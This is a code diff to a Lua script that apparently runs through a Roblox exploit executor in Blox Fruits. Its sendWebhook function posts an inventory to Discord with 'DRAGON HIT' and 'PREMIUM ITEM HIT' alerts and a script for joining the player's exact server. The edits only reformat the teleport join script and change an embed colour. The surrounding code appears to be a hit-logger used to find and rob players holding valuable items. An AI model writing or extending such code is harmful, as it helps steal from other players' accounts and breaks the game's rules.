@@ -795,22 +795,30 @@ local function sendWebhook(inventory)
     local isSea3 = (placeId == 7449423635);
     local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
     local joinScriptFormatString = [=[
-local iddd = %d
-local JobIdd = "%s"
-local sea = "%s"
+    local iddd = %d
+    local JobIdd = "%s"
+    local sea = "%s"
 
-if game.PlaceId ~= iddd then
-    queue_on_teleport([[
-        task.wait(5)
+    if game.PlaceId ~= iddd then
+        queue_on_teleport([[
+            task.wait(5)
+            if game.JobId ~= JobIdd then -- Extra check
+                print("Executing queued teleport to: " .. JobIdd)
+                game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+            else
+                print("Already in target server, skipping queued teleport.")
+            end
+        ]])
+        print("Invoking sea travel: " .. sea)
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
+    else
         if game.JobId ~= JobIdd then
-            game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+             print("Already in correct sea, teleporting directly to: " .. JobIdd)
+             game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
         else
+             print("Already in target server instance.")
         end
-    ]])
-    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
-else
-    game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
-end
+    end
 ]=]
     local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
     local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
@@ -826,7 +834,7 @@ end
        baseMention = "@everyone Sharky - GG!"
    elseif dragonHit then
        baseEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!** <a:among_us_party:780475189519056946>";
-       baseEmbedColor = 255;
+       baseEmbedColor = 16711680;
        baseMention = "@everyone Sharky - GG!"
    elseif hasPremiumItem then
        baseEmbedTitle = "<a:among_us_party:780475189519056946> **PREMIUM ITEM HIT!** <a:among_us_party:780475189519056946>";
